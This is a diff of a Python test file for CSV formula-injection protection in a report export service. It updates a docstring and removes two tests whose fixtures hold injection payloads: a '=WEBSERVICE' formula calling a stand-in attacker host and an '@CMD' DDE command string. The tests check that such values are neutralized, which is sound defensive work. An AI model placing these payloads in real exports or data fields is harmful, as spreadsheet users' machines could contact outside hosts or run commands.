@@ -3,9 +3,9 @@
 ExportService._format_csv_report previously wrote raw scanner / agent
 strings through csv.writer directly, bypassing the _csv_safe guard
 defined in reports.py.  This test pins the new shared
-``app.services.csv_utils.safe_csv_row`` behaviour for every branch:
-``scope_report``/``scan_report``, ``out_of_scope_findings``, and
-``test_plan_execution``.
+``app.services.csv_utils.safe_csv_row`` behaviour for its one report,
+``test_plan_execution`` (the scope / scan / out-of-scope branches were never
+reached and were removed in v2.395.0).
 """
 from __future__ import annotations
 
@@ -14,7 +14,7 @@ import io
 
 import pytest
 
-from app.services.csv_utils import csv_safe, safe_csv_row
+from app.services.csv_utils import csv_safe
 from app.services.export_service import ExportService
 
 
@@ -173,52 +173,6 @@ def test_scan_hosts_csv_neutralizes_malicious_hostname(
 
 def _parse_csv(payload: str) -> list[list[str]]:
     return list(csv.reader(io.StringIO(payload)))
-
-
-def test_scope_report_neutralizes_malicious_hostname():
-    svc = ExportService(db=None)  # _format_csv_report doesn't touch the session
-    data = {
-        "report_type": "scope_report",
-        "hosts": [
-            {
-                "ip_address": "10.0.0.5",
-                "hostname": "=WEBSERVICE(\"http://attacker.tld\")",
-                "state": "up",
-                "os_name": "Linux",
-                "ports": [{"port_number": 22, "protocol": "tcp"}],
-                "subnets": [],
-                "dns_records": [],
-                "scan_id": 1,
-            },
-        ],
-    }
-    result = svc._format_csv_report(data)
-    rows = _parse_csv(result["data"])
-    # row[0] is the header; row[1] is the data row.  Hostname is column index 1.
-    assert rows[1][1].startswith("'="), \
-        f"hostname formula not neutralized: {rows[1][1]!r}"
-
-
-def test_out_of_scope_csv_neutralizes_malicious_reason():
-    svc = ExportService(db=None)
-    data = {
-        "report_type": "out_of_scope_findings",
-        "findings": [
-            {
-                "ip_address": "192.168.99.1",
-                "hostname": "ignored",
-                "tool_name": "nmap",
-                "reason": "@CMD|'/c calc'!A1",
-                "ports": [80],
-                "found_at": "2026-06-03T00:00:00Z",
-            },
-        ],
-    }
-    result = svc._format_csv_report(data)
-    rows = _parse_csv(result["data"])
-    # Reason is column index 3.
-    assert rows[1][3].startswith("'@"), \
-        f"reason formula not neutralized: {rows[1][3]!r}"
 
 
 def test_test_plan_execution_csv_neutralizes_hostname_command_and_findings():
